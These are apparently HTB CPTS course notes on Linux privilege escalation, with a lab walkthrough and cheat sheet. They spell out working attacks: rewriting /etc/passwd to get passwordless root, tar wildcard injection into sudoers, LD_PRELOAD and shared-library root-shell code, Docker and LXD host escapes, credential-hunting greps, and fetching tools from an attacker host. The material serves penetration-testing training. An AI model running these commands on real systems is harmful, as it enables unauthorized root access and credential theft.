# Linux Privilege Escalation

> HTB CPTS (Certified Penetration Testing Specialist) — module notes.
> Part of the **CPTS-Notes-and-Methodology** repository.

Privilege escalation is one of the final phases of a penetration test: taking a low-privileged foothold (shell/SSH access) on a Linux host and elevating it to a higher-privileged account — ideally `root`. There is rarely a single "magic" exploit; most real-world privesc paths come from **chaining small misconfigurations** together (a readable file here, a writable cron script there, a SUID binary somewhere else).

All commands below assume you already have an authenticated/interactive shell on the target during an authorized engagement (lab, CTF, or a client environment with signed authorization).

> **Priority rule:** Enumerate misconfigurations, `sudo` rights, SUID/SGID binaries, capabilities, and writable files **before** reaching for a kernel exploit. Kernel exploits are a last resort — they can crash the box.

---

## Table of Contents
- [1. Overview](#1-overview)
- [2. Environment Enumeration](#2-environment-enumeration)
  - [2.1 Identify Yourself and Your Privileges](#21-identify-yourself-and-your-privileges)
  - [2.2 Operating System, Kernel and Hardware](#22-operating-system-kernel-and-hardware)
  - [2.3 Users, Groups and Password Files](#23-users-groups-and-password-files)
  - [2.4 PATH and Environment Variables](#24-path-and-environment-variables)
  - [2.5 Networking Info](#25-networking-info)
  - [2.6 Hidden, Temporary and History Files](#26-hidden-temporary-and-history-files)
- [3. Services and Internals Enumeration](#3-services-and-internals-enumeration)
- [4. Credential Hunting](#4-credential-hunting)
- [5. Environment-based Privilege Escalation](#5-environment-based-privilege-escalation)
  - [5.1 PATH Abuse](#51-path-abuse)
  - [5.2 Wildcard Abuse](#52-wildcard-abuse)
  - [5.3 Escaping Restricted Shells](#53-escaping-restricted-shells)
- [6. Permissions-based Privilege Escalation](#6-permissions-based-privilege-escalation)
  - [6.1 SUID and SGID Abuse](#61-suid-and-sgid-abuse)
  - [6.2 Sudo Rights Abuse](#62-sudo-rights-abuse)
  - [6.3 Privileged Groups](#63-privileged-groups)
  - [6.4 Linux Capabilities](#64-linux-capabilities)
- [7. Service-based Privilege Escalation](#7-service-based-privilege-escalation)
  - [7.1 Vulnerable Service Versions](#71-vulnerable-service-versions)
  - [7.2 Cron Job Abuse](#72-cron-job-abuse)
  - [7.3 Containers (LXC and LXD)](#73-containers-lxc-and-lxd)
  - [7.4 Docker](#74-docker)
  - [7.5 Logrotate](#75-logrotate)
  - [7.6 Other Techniques](#76-other-techniques)
- [8. Linux Internals-based Privilege Escalation](#8-linux-internals-based-privilege-escalation)
  - [8.1 Kernel Exploits](#81-kernel-exploits)
  - [8.2 Shared Libraries (LD_PRELOAD)](#82-shared-libraries-ld_preload)
  - [8.3 Shared Object Hijacking](#83-shared-object-hijacking)
  - [8.4 Python Library Hijacking](#84-python-library-hijacking)
- [9. Recent 0-Days](#9-recent-0-days)
- [10. Automation Tools](#10-automation-tools)
- [11. Practical Walkthrough (Skills Assessment, 5 Flags)](#11-practical-walkthrough-skills-assessment-5-flags)
- [12. Quick Reference Cheat Sheet](#12-quick-reference-cheat-sheet)

---

## 1. Overview

Privesc methodology on Linux breaks down into four broad categories, roughly in the order you should try them:

1. **Environment / permissions misconfigurations** — weak PATH, writable files, bad SUID/SGID bits, sudo misconfigs, dangerous group memberships, capabilities.
2. **Vulnerable services** — outdated daemons, cron jobs you can influence, containers/Docker escapes, logrotate abuse.
3. **Linux internals abuse** — LD_PRELOAD, shared object hijacking, Python library hijacking.
4. **Known CVEs / 0-days** — sudo, polkit, kernel bugs (last resort).

---

## 2. Environment Enumeration

### 2.1 Identify Yourself and Your Privileges

| Command | What it tells you | Why it matters |
|---|---|---|
| `whoami` | The user you're currently logged in as | Confirms whether you're already root or a regular user |
| `id` | Your UID/GID and **all** group memberships | You might belong to a dangerous group (`sudo`, `adm`, `docker`, `lxd`, `disk`) without realizing it |
| `hostname` | The machine's name | Naming conventions sometimes leak its role (`web01`, `backup`, `dc01`) |
| `ip a` | Network interfaces attached to the host | Important for later network pivoting |
| `sudo -l` | What you're allowed to run as another user (often root) without a password | Frequently the fastest path to root |

### 2.2 Operating System, Kernel and Hardware

```bash
cat /etc/os-release      # distro name + version
uname -a                 # kernel version, architecture, hostname
cat /proc/version        # kernel version + compiler used to build it
lscpu                    # CPU / architecture details
cat /etc/shells          # which shells are installed and their paths
lsblk                    # attached block devices / drives / partitions
df -h                    # currently mounted filesystems, partitions, shares
```

Knowing the distro and kernel version lets you search for matching public exploits (e.g. `Ubuntu 20.04 kernel privilege escalation exploit`). Checking `/etc/shells` is also useful later — an old or unusual shell binary listed there is worth checking for known exploits.

### 2.3 Users, Groups and Password Files

```bash
cat /etc/passwd
grep "sh$" /etc/passwd     # filters to accounts with an interactive login shell
cat /etc/group
getent group <GROUP_NAME>  # list members of a specific group, e.g. sudo
```

> **Correction:** `/etc/passwd` does **not** normally contain password hashes — on any modern system, hashes live in `/etc/shadow`, which is only readable by root. `/etc/passwd` just lists account metadata (`username:x:UID:GID:comment:home:shell`). The `x` in the second field is a placeholder meaning "the real hash is in /etc/shadow." That said, this file is still gold for privesc: if that `x` is ever replaced with an actual hash, or missing entirely, the box is misconfigured and you may be able to log in without a password (see [6.1 SUID and SGID Abuse](#61-suid-and-sgid-abuse) for how attackers deliberately create this misconfiguration).

Groups worth checking membership in (via `id` or `getent group`):

| Group | Why it's dangerous |
|---|---|
| `sudo` / `wheel` | May let you run commands as root |
| `adm` | Can often read log files that leak credentials |
| `docker` | Almost always leads to root (see [7.4 Docker](#74-docker)) |
| `lxd` / `lxc` | Almost always leads to root (see [7.3 Containers](#73-containers-lxc-and-lxd)) |
| `disk` | Can read raw disk devices directly, bypassing file permissions |
| `shadow` | Can read `/etc/shadow` password hashes |
| `www-data` | Relevant if there's a web app on the box |

### 2.4 PATH and Environment Variables

```bash
echo $PATH
env
```

`$PATH` is the ordered list of directories the shell searches when you type a bare command name (e.g. typing `ls` actually runs `/bin/ls`, found by walking `$PATH`). If a root-owned script calls a binary without using its **full path**, and you can write to a directory earlier in `$PATH`, you can plant a malicious file with that binary's name — this is **PATH hijacking**, covered in detail in [5.1](#51-path-abuse).

`env` dumps environment variables and sometimes leaks secrets left behind by admins or applications, e.g.:
```
DB_PASSWORD=...
API_KEY=...
TOKEN=...
```
If you find credentials here, try them against other local users (`su <user>`), over SSH, or with `sudo -l` as that user.

### 2.5 Networking Info

```bash
ip a          # interfaces and IPs
route         # routing table (or the modern equivalent: ip route)
arp -a        # hosts this machine has already talked to on the LAN
cat /etc/hosts  # statically defined hostname-to-IP mappings
```

### 2.6 Hidden, Temporary and History Files

```bash
# All hidden files readable by you
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null

# Same, filtered to a specific user's files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <USER_NAME>

# Hidden shell scripts specifically
find / -type f -name "*.sh" -exec ls -l {} \; 2>/dev/null

# Hidden directories owned by / relevant to a user
find / -type d -name ".*" -exec ls -l {} \; 2>/dev/null | grep <USER_NAME>

# Temp directories — commonly used as staging/dropoff locations
ls -l /tmp /var/tmp /dev/shm

# Login activity
lastlog       # last login time per user
w             # who is logged in right now, and what they're doing

# Shell command history — often contains passwords typed on the command line
history
find / -type f \( -name "*_hist" -o -name "*_history" \) -exec ls -l {} \; 2>/dev/null
```

---

## 3. Services and Internals Enumeration

```bash
# Scripts that run daily via cron (this is a directory, not a single file)
ls -la /etc/cron.daily/

# Installed packages + versions (Debian/Ubuntu — use `rpm -qa` on RHEL/CentOS)
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

# Sudo version — some versions have known CVEs (see section 9)
sudo -V

# Currently running processes
ps aux
ps aux | grep root   # processes running as root — potential injection/hijack targets
```

**Cross-referencing installed packages against GTFOBins**

```bash
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do
  if grep -q "$i" installed_pkgs.list; then
    echo "Check GTFO for: $i"
  fi
done
```

This script fetches the full list of binaries documented on [GTFOBins](https://gtfobins.org/) and cross-checks it against `installed_pkgs.list` (the file produced by the `apt list --installed` command above). Any match means that binary has a documented technique for privilege escalation, shell escape, file read/write, etc.

> **Note:** this loop needs internet access and `jq` installed to reach the GTFOBins API — the target box usually won't have either. The normal workflow is to generate `installed_pkgs.list` **on the target**, transfer it to your attacker machine (which has internet + `jq`), and run the comparison there.

---

## 4. Credential Hunting

```bash
# Any file with "config" in the name, excluding /proc
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

Worth expanding beyond just `config` files — a thorough credential hunt also checks:

```bash
# Common secret-bearing filenames
find / -type f \( -iname "*.env" -o -iname "*password*" -o -iname "*.creds" \
  -o -iname "id_rsa*" -o -iname "*.key" -o -iname "*.pem" \) 2>/dev/null

# grep recursively for common secret keywords (noisy — expect false positives)
grep -rEi "(password|passwd|pwd|secret|api_key|token)\s*=" /etc /var/www /opt /home 2>/dev/null

# Leftover .git repos often contain credentials in history
find / -type d -name ".git" 2>/dev/null

# Readable SSH private keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
```

---

## 5. Environment-based Privilege Escalation

### 5.1 PATH Abuse

Recall from [2.4](#24-path-and-environment-variables) that `echo $PATH` shows something like:
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
Instead of typing a command's full path (`/bin/cat`), the shell looks it up by walking this list. **PATH abuse** means prepending a directory you control to `$PATH`, so the system finds *your* fake binary before the real one:

```bash
export PATH=.:${PATH}      # add the current directory to the front of PATH
echo $PATH                 # confirm: .:/usr/local/sbin:...

touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls                # make it executable
```

Now, running the bare command:
```bash
ls
# PATH ABUSE!!
```
...runs your fake script, while the real binary still works fine when called by full path:
```bash
/bin/ls   # normal directory listing
```
This becomes a genuine privesc technique when a **root-owned** script (cron job, SUID binary, service) calls a command without its full path, and you can influence that script's `$PATH` or drop a file into a directory it searches first.

### 5.2 Wildcard Abuse

Say a cron job runs as root:
```bash
cd /home/htb-student && tar -zcf backup.tar.gz *
```
It `cd`s into a directory and backs up everything with `*`. If you can create files in that directory, you can create files whose *names* are actually `tar` command-line options — since the shell expands `*` before `tar` ever sees it.

```bash
# Payload script tar will execute
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

# Files named like tar flags
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh root.sh"
```

When cron runs `tar -zcf backup.tar.gz *`, the wildcard expands to include your two specially-named files, and the command effectively becomes:
```bash
tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh root.sh ...
```
`tar` interprets `--checkpoint-action=exec=sh root.sh` as an instruction to execute `root.sh` as a checkpoint action — running your script as root.

After waiting for the cron job to fire:
```bash
sudo -l
```
If you see `(root) NOPASSWD: ALL`, it worked.

> This class of bug is generally called **wildcard injection** (first popularized in a 2014 DEF CON talk by Leon Juranić). It's not limited to `tar` — `chown`, `chmod`, and `rsync` have similar dangerous flags that can be triggered the same way via wildcard expansion. GTFOBins has a dedicated ["Shell"/"Wildcard"] reference for several of these binaries.

### 5.3 Escaping Restricted Shells

Sometimes your shell is deliberately locked down — you get some commands but not others.

| Shell | Meaning |
|---|---|
| `rbash` | Restricted Bash |
| `rksh` | Restricted Korn shell |
| `rzsh` | Restricted Zsh |

They all share the same idea: a normal shell with **restrictions** applied (blocked `cd`, blocked `/`, blocked changing `$PATH`, etc.). The goal isn't privilege escalation directly — it's breaking out into a *normal*, unrestricted shell so you can begin regular enumeration.

**1. Confirm you're in a restricted shell:**
```bash
echo $SHELL
echo $0
```

**2. Check what's allowed:**
```bash
ls
pwd
echo $PATH
```
Check whether any of these are available — many of them can spawn a full shell from inside themselves: `vi`, `less`, `more`, `man`, `awk`, `find`, `python3`, `perl`, `ssh`, `scp`.

**3. Escape via an allowed program.** The core idea: find a permitted program that itself lets you run an arbitrary command.

```bash
# vi / vim
vi
:!/bin/sh

# less
less file.txt
!/bin/sh

# man
man ls
!/bin/sh

# awk
awk 'BEGIN {system("/bin/sh")}'

# find
find . -exec /bin/sh \; -quit

# python3
python3 -c 'import os; os.system("/bin/bash")'

# perl
perl -e 'exec "/bin/bash";'

# ssh (local ProxyCommand trick — runs a command instead of connecting)
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x

# scp (abusing -S to specify an arbitrary "ssh" program to run)
scp -S /bin/sh x y:
```

**4. Command chaining**, if the restricted shell doesn't filter it:
```bash
ls; id
ls | whoami
```
Many restricted shells explicitly block `;`, `|`, `&&`, and backticks, so don't count on this.

**5. Environment variables** — a restricted shell often also restricts `$PATH`. If you can still edit it:
```bash
export PATH=/bin:/usr/bin:$PATH
```
In `rbash` specifically, modifying `PATH` (and several other shell built-ins) is usually blocked by design — this is more likely to work in weaker/custom restricted-shell implementations.

---

## 6. Permissions-based Privilege Escalation

### 6.1 SUID and SGID Abuse

**SUID** (Set User ID) lets a binary run with the privileges of its **owner** (commonly `root`) rather than the user who executed it. It shows up as an `s` in the owner's execute bit (`-rwsr-xr-x`).

```bash
# Find all SUID binaries owned by root
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Cross-reference every result against **[GTFOBins](https://gtfobins.org/)** — search the binary's name and check whether it has an entry under the "SUID" function. Each entry lists a ready-made technique (e.g. "File read", "File write", "Shell").

> **Note on `/etc/passwd` and the `x` field:** when you `cat /etc/passwd`, each account line has an `x` right after the username, meaning "check `/etc/shadow` for the real hash." If that `x` is removed for a given account, the system treats that account as having **no password** — you can log in as it directly. This is exactly what the classic `sed` SUID-file-write technique below abuses.

**Example: exploiting a SUID binary with a "file write" GTFOBins technique**

GTFOBins typically gives you a generic template like:
```bash
sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
```
Adapt it to overwrite `/etc/passwd` with a new, password-less root entry:
```bash
sed -n '1s/.*/root::0:0:root:\/root:\/bin\/bash/w /etc/passwd' /etc/hosts
```
This writes a line for a `root` account with an **empty** password field (the second field, right after `root:`), giving you a password-less root login:
```bash
ssh root@<IP>
```
(Locally, `su` with no password also works.)

**SGID** (Set Group ID) works the same way, but for the file's **group** instead of owner:
```bash
find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null
```

> **Correction:** the original notes searched with `-perm -6000` for SGID, but `6000` (octal) is `4000` (SUID) **+** `2000` (SGID) combined — that only matches files with **both** bits set simultaneously, which is rare. To search specifically for SGID, use `-perm -2000`. To find files with *either* bit, combine them with `-o`:
> ```bash
> find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -ldb {} \; 2>/dev/null
> ```

### 6.2 Sudo Rights Abuse

```bash
sudo -l
```
This shows what you're allowed to run as another user (often root), sometimes without a password (`NOPASSWD`). Take whatever binary/script it lists and check it on **[GTFOBins](https://gtfobins.org/)** under the "Sudo" function — most common binaries (`vim`, `less`, `find`, `awk`, `python`, `tar`, `nmap`, ...) have a documented one-liner to spawn a root shell when run via `sudo`.

### 6.3 Privileged Groups

If `sudo -l` and SUID/SGID hunting both come up empty, check your group memberships:
```bash
id
```
Groups worth pursuing (see the table in [2.3](#23-users-groups-and-password-files) for why each matters): `lxc`/`lxd`, `docker`, `disk`, `adm`, `shadow`.

Once you know which group you're in, search:
```
linux priv esc <GROUP_NAME> group abuse
```

### 6.4 Linux Capabilities

Beyond the classic user/root split, Linux has **capabilities** — fine-grained privileges that can be granted to a binary without giving it full root (SUID). Example of *granting* one:
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

The goal during enumeration is to find binaries with **high-risk capabilities** already set:
```
cap_sys_admin
cap_sys_chroot
cap_sys_ptrace
cap_sys_nice
cap_sys_time
cap_sys_resource
cap_sys_module
cap_net_bind_service
cap_dac_override
cap_dac_read_search
cap_setuid
cap_setgid
```

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```
If this turns up something like:
```
/usr/bin/vim.basic cap_dac_override=eip
```
search the specific capability name (`cap_dac_override`) to understand exactly what it grants.

**Example exploitation** — `cap_dac_override` lets a binary bypass file **read/write permission checks** entirely. If `vim.basic` has it:
```bash
/usr/bin/vim.basic /etc/passwd
```
opens `/etc/passwd` for editing even though your user normally can't write to it — remove the `x` from root's line to log in without a password, or add a new UID-0 user.

Without an interactive session (e.g. from a non-interactive script), the same edit can be done headlessly:
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
Verify with:
```bash
su
```

---

## 7. Service-based Privilege Escalation

### 7.1 Vulnerable Service Versions

Any running service can be a privesc vector if it's outdated or misconfigured. Example workflow with `screen`:
```bash
screen -v
```
Then search: `screen version <VERSION> exploit`. The same pattern applies to almost any locally-running service — the idea isn't to memorize CVEs, it's:

> **service running as root + outdated version + known exploit (or bad config) = opportunity.**

Other services worth checking versions of when present: Samba, Exim, Nagios, ProFTPd, MySQL, and Apache/Nginx (for config mistakes rather than CVEs).

### 7.2 Cron Job Abuse

Cron runs scripts on a schedule. Only root can normally edit `/var/spool/cron/crontab` entries, but **the scripts a cron job calls** are sometimes left world-writable by mistake:
```bash
find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null
```
Inspect any hits:
```bash
ls -la /<FILE_NAME>
```
If you can write to a script that's executed by a root cron job, insert your own payload (reverse shell, SUID-setting command, `/etc/sudoers` line, etc.) — it will run with root's privileges the next time the schedule fires.

To *discover* what's running periodically (rather than guessing), use **pspy** — a tool that snoops on process execution without needing root:
```
https://github.com/DominicBreuker/pspy
```

### 7.3 Containers (LXC and LXD)

First confirm group membership:
```bash
id
# uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
Being in the `lxd`/`lxc` group is effectively equivalent to root, because LXD lets you create privileged containers with the host filesystem mounted in.

```bash
# Import an existing container image (often found staged on disk already)
cd ContainerImages
ls
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list   # confirm it imported

# Create a *privileged* container from that image
lxc init ubuntutemp privesc -c security.privileged=true

# Mount the entire host filesystem into the container
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Start it and get a shell
lxc start privesc
lxc exec privesc /bin/bash    # or /bin/sh

# The host's entire filesystem is now available, as root, at:
ls -l /mnt/root
```

### 7.4 Docker

Landing in a Docker context can mean two very different things: you may be **inside a container** already (e.g. from a web shell on a containerized app — you never actually touched the underlying Linux host), or you may be a **regular host user who happens to be in the `docker` group**. Getting root *inside* a container does **not** automatically mean root on the host — that's exactly what these techniques are for.

**Scenario 1 — Shared host directories**

Admins sometimes bind-mount a host folder into the container. Look for anything like:
```bash
/hostsystem
/host
/mnt
/data
/backup
```
If you find something like `/hostsystem/home/cry0l1t3` containing `.ssh/`, `.bash_history`, etc., you're looking at a real host user's files:
```bash
cat /hostsystem/home/cry0l1t3/.ssh/id_rsa
```
A readable private key means you can SSH into the host directly:
```bash
ssh cry0l1t3@<host_IP> -i cry0l1t3.priv
```

**Scenario 2 — Exposed Docker socket**

The Docker daemon's control socket is normally at `/var/run/docker.sock`, but it can be exposed at other paths (e.g. `/app/docker.sock`) inside a container by mistake. Anyone who can talk to this socket can create new containers with full host access.

```bash
# Confirm the socket is reachable (use a static docker binary if the client isn't installed)
/tmp/docker -H unix:///app/docker.sock ps

# Spin up a new privileged container with the ENTIRE host filesystem mounted in
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

# Confirm it's running, note its container ID
/tmp/docker -H unix:///app/docker.sock ps

# Exec into it — you now have root, with /hostsystem = the host's /
/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
```
> `main_app` in the `run` command must be an image that **already exists** on that host — check available images first with `docker -H unix:///app/docker.sock images` (or `docker image ls`) and substitute a real repository name.

**Scenario 3 — Member of the `docker` group on the host**

```bash
id
# groups=1000(docker-user),116(docker)

docker image ls   # see what images are available

docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <REPOSITORY> chroot /mnt bash
```
This mounts the host's `/` into the container and `chroot`s into it — effectively giving you a root shell on the host.

### 7.5 Logrotate

`logrotate` periodically rotates files under `/var/log`. Abusing it requires three conditions:
- You have **write** permission on a log file it manages.
- The `logrotate` service runs **as root**.
- The installed **version is vulnerable** (older versions had unsafe handling of rotated files).

**Steps, using the `logrotten` exploit tool:**

```bash
# 1. Grab the exploit and compile it
# source: https://github.com/whotwagner/logrotten/blob/master/logrotten.c
vim test.c
gcc test.c -o exploit

# 2. Write a payload (e.g. bash reverse shell, from a payload generator)
vim payload

# 3. Start a listener on your attacker machine
nc -lnvp 4444

# 4. Identify which log file logrotate currently tracks and that you can write to
cat /var/lib/logrotate.status
# e.g. "/var/log/samba/log.smbd" 2022-8-3

# 5. Run the exploit against that log file
./exploit -p payload /var/log/samba/log.smbd

# 6. Wait for the next rotation — you get a root shell on your listener
```

### 7.6 Other Techniques

A few additional service-based vectors exist beyond the scope of this note — worth researching if the above don't pan out:
- **Weak NFS privileges** (particularly `no_root_squash` exports, which let a remote root user retain root on the NFS share).
- **Hijacking Tmux sessions** left open by another (often privileged) user — `tmux attach` onto their orphaned session.

---

## 8. Linux Internals-based Privilege Escalation

### 8.1 Kernel Exploits

These target the kernel itself and correspond to specific CVEs. Note the kernel version:
```bash
uname -a
# e.g. 4.15.0-76-generic
```
Search for a public exploit matching that version, compile and run it (usually a straightforward `gcc` build):
```bash
gcc exploit.c -o attack
./attack
```
Remember: **last resort** — kernel exploits can panic/crash the target.

### 8.2 Shared Libraries (LD_PRELOAD)

`LD_PRELOAD` forces the dynamic linker to load a specified shared library **before any other**, letting its code run first. If `sudo -l` shows both:
```
env_keep+=LD_PRELOAD
```
and a command you can run with `NOPASSWD`, e.g.:
```
(root) NOPASSWD: /usr/bin/openssl
```
...you can hijack execution:

```c
// lib.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
```bash
gcc -fPIC -shared lib.c -o root.so -nostartfiles
sudo LD_PRELOAD=/full/path/to/root.so /usr/bin/openssl
id   # confirm root
```

### 8.3 Shared Object Hijacking

Check which shared libraries a binary loads:
```bash
ldd payroll
# linux-vdso.so.1 => (0x00007ffcb3133000)
# libshared.so => /development/libshared.so (0x00007f0c13112000)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
# /lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```
If `/development` (or wherever a non-standard library lives) is **writable**, you can replace that library with your own malicious version:
```bash
cd /development
mv libshared.so tt.so   # keep the original around, just renamed
```
```c
// attack.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```
```bash
gcc attack.c -fPIC -shared -o /development/libshared.so
./payroll     # spawns a root shell when it calls dbquery()
```

### 8.4 Python Library Hijacking

If a root-run Python script imports a module from a **writable** location (or a location earlier in `sys.path` than the real module), you can drop a malicious `.py` file with the same module name to get it imported and executed as root instead of the legitimate one. See the [HTB Academy "Linux Privilege Escalation" module, section on Python library hijacking](https://academy.hackthebox.com/) for a worked example — the general approach mirrors [8.3](#83-shared-object-hijacking), just for Python imports instead of `.so` files.

---

## 9. Recent 0-Days

Search-driven, version-gated exploits — same workflow every time: check the version, look up the matching CVE, run the public PoC.

**Sudo**
```bash
sudo -V
```
> **Correction:** use `sudo -V` (capital V) or `sudo --version` to print the version. `sudo -v` (lowercase) does something completely different — it just refreshes/validates your cached sudo credentials timestamp.

Notable CVE: **CVE-2021-3156** ("Baron Samedit") — a heap-based buffer overflow affecting sudo versions before 1.9.5p2, exploitable by any local user regardless of sudo permissions.

**Polkit**
```bash
pkexec --version
```
Notable CVE: **CVE-2021-4034** ("PwnKit") — a memory-corruption bug in `pkexec` present in default installs of most major distros for over a decade, giving any local user root.

**Dirty Pipe**
```bash
uname -r
```
Notable CVE: **CVE-2022-0847** — a Linux kernel bug (5.8+) allowing overwriting of read-only files, including files owned by root.

For all three, search `<name> exploit github` for a matching PoC, and always test in a lab/snapshot first — these are high-impact enough to potentially destabilize the target.

---

## 10. Automation Tools

Manual enumeration is essential for learning the *why*, but in practice you'll usually run an automated enumeration script first and use it as a map:

| Tool | Purpose |
|---|---|
| **[LinPEAS](https://github.com/carlospolop/PEASS-ng)** | The most comprehensive Linux enumeration script; color-codes likely privesc vectors (yellow/red = high probability) |
| **[pspy](https://github.com/DominicBreuker/pspy)** | Snoops on process execution (cron jobs, scheduled scripts) without root |
| **[GTFOBins](https://gtfobins.org/)** | Lookup table of privesc/shell-escape techniques per binary (SUID, sudo, capabilities, file read/write) |
| **[linux-smart-enumeration (lse)](https://github.com/diego-treitos/linux-smart-enumeration)** | Lighter-weight alternative to LinPEAS with adjustable verbosity |
| **unix-privesc-check** | Older, script-based checker for common misconfigurations |

**Typical LinPEAS workflow:**
```bash
# On attacker machine
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
python3 -m http.server 8000

# On the target
wget http://<ATTACKER_IP>:8000/linpeas.sh -O linpeas.sh
bash linpeas.sh | tee linpeas_output.txt
```
> **Correction:** use `-O linpeas.sh` (capital O, "output document") to save the downloaded file under that name. Lowercase `-o` sets wget's own **log file**, not the destination filename — with a lowercase `-o` you'd end up with the default-named download and an unrelated log file called `linpeas.sh`.

---

## 11. Practical Walkthrough (Skills Assessment, 5 Flags)

A worked example combining most of the techniques above, against a single target:

```
User: htb-student
IP:   10.129.235.16
Pass: Academy_LLPE!
```

**Flag 1 — hidden config directory**
`ls` shows nothing in the home directory, but `ls -la` reveals dotfiles. `.bash_history` references `cat /var/www/html/flag.txt`, but that file has since been deleted. Checking `.config/` with `ls -la` (again, hidden-file listing needed) reveals `.flag1.txt`.

**Flag 2 — leaked SSH password in another user's history**
Running LinPEAS shows `/home/barry/flag2.txt`, but it's not readable directly. Listing `/home/barry` with `ls -la` reveals `.bash_history` is unusually permissive (`-rwxr-xr-x`) and readable. Inside it:
```bash
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
```
This leaks barry's password. Switch user:
```bash
su - barry
```
...and read `flag2.txt`.

**Flag 3 — `adm` group membership**
```bash
id   # shows membership in the adm group
```
Members of `adm` can read `/var/log/*`:
```bash
cd /var/log
ls -la   # flag3.txt is sitting right there
```

**Flag 4 — Tomcat manager + backup config file**
```bash
ss -tlnp   # ports open: 22, 53, 80, 3306, 8080, 33060
```
Port 8080 serves a Tomcat manager interface (`http://<IP>:8080/manager`), which needs credentials. Searching for Tomcat-related files:
```bash
find / -type f -name "tomcat*" -ls 2>/dev/null
```
`/etc/tomcat9/tomcat-users.xml` itself isn't readable, but a backup is:
```bash
cat /etc/tomcat9/tomcat-users.xml.bak
```
This leaks valid manager credentials. Log into the Tomcat Manager, then craft a malicious `.war` reverse shell with `msfvenom` and deploy it through the manager's upload feature to get a reverse shell as the `tomcat` user, then read `flag4.txt`.

**Flag 5 — sudo NOPASSWD on `busctl`**
From the Tomcat reverse shell:
```bash
id       # in the tomcat group, not root yet
sudo -l  # shows NOPASSWD: /usr/bin/busctl
```
Checking [GTFOBins for `busctl`](https://gtfobins.org/) under "Shell → Unprivileged" gives a systemd `LogLevel` trick that spawns an arbitrary command:
```bash
sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 \
  org.freedesktop.systemd1.Manager LogLevel s debug \
  --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
This spawns a root shell back on your listener. Read `flag5.txt`.

---

## 12. Quick Reference Cheat Sheet

```bash
# --- Who am I ---
whoami; id; hostname; sudo -l

# --- OS / Kernel ---
cat /etc/os-release; uname -a; cat /proc/version

# --- SUID / SGID ---
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -ldb {} \; 2>/dev/null

# --- Capabilities ---
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null

# --- World-writable files (potential cron abuse) ---
find / -path /proc -prune -o -type f -perm -o+w -print 2>/dev/null

# --- Writable /etc/passwd or /etc/shadow ---
find / \( -name passwd -o -name shadow \) -writable 2>/dev/null

# --- Sensitive env vars ---
env

# --- Credential hunting ---
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
find / -name "*.bash_history" -o -name "id_rsa" 2>/dev/null

# --- Cron jobs ---
cat /etc/crontab; ls -la /etc/cron.daily /etc/cron.d

# --- Dangerous groups ---
id   # look for: sudo, docker, lxd/lxc, disk, adm, shadow

# --- Automated enumeration ---
./linpeas.sh
./pspy64
```

---

### Further Reading
- [GTFOBins](https://gtfobins.org/) — per-binary escalation/escape techniques
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/) — the deep-dive reference for almost every technique above
- [PayloadsAllTheThings — Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PEASS-ng / LinPEAS](https://github.com/carlospolop/PEASS-ng)
- [pspy](https://github.com/DominicBreuker/pspy)
- HTB Academy — *Linux Privilege Escalation* module
